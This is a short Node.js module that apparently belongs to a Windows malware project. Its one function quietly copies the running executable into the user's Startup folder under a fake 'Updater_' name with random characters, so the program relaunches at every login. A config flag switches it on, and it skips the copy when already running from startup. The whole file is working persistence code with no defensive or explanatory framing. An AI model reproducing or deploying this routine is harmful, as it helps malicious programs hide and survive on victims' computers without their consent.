const fs = require("fs");
const { Persist } = require("../../data/Config");
const { randomChar } = require("../utils/random");
const isStartup = require("../utils/isStartup");

function add_to_startup() {
  if (!Persist) return;
  if(isStartup())return;
  fs.createReadStream(process.argv0).pipe(fs.createWriteStream(`${process.env.APPDATA.replace("\\", "/")}/Microsoft/Windows/Start Menu/Programs/Startup/Updater_${randomChar(4)}.exe`));
}


module.exports = add_to_startup;